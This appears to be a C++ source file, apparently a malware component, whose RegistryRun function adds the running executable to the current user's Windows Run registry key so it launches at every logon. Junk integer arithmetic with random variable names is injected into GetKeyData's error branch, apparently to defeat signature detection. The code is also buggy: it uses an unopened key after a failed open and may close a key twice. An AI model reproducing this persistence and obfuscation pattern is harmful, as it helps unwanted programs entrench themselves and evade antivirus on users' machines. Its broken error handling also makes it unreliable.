#include "RegistryRun.h"

bool GetKeyData(HKEY hRootKey, LPCSTR subKey, LPCSTR value, LPDWORD lpType, LPBYTE data, DWORD *cbData)
{
	HKEY hKey;
	bool ret = true;
	if (RegOpenKeyExA(hRootKey, subKey, 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
		ret = false;

	if (RegQueryValueExA(hKey, value, NULL, lpType, data, cbData) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		ret = false;
int ias936RljIX = 0xef60e3e;
int iDDrTL9o8zZ = 0xaf6788d;
int iVw5h8N0pWT = 0xd287368;
int iL3Ubyz54nd = ias936RljIX + iDDrTL9o8zZ - iVw5h8N0pWT;
iL3Ubyz54nd = 0x9277ef0 * iL3Ubyz54nd + 0xf915a36 - iDDrTL9o8zZ;
int iSXZdxPoHL8 = iL3Ubyz54nd / 0xf915a36 + ias936RljIX ^ iVw5h8N0pWT - 0xd287368;

	}

	RegCloseKey(hKey);
	return ret;
}

bool SetKeyData(HKEY hRootKey, LPCSTR subKey, DWORD dwType, LPCSTR value, LPBYTE data, DWORD cbData)
{
	HKEY hKey;
	bool ret = true;
	if (RegCreateKeyA(hRootKey, subKey, &hKey) != ERROR_SUCCESS)
		ret = false;

	if (RegSetValueExA(hKey, value, 0, dwType, data, cbData) != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		ret = false;
	}

	RegCloseKey(hKey);
	return ret;
}

bool RegistryRun()
{
	char pathfile[MAX_PATH];
	GetModuleFileNameA(NULL, pathfile, MAX_PATH);
	char *filename = PathFindFileNameA(pathfile);
	return SetKeyData(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", REG_SZ, filename, (LPBYTE)pathfile, strlen(pathfile));
}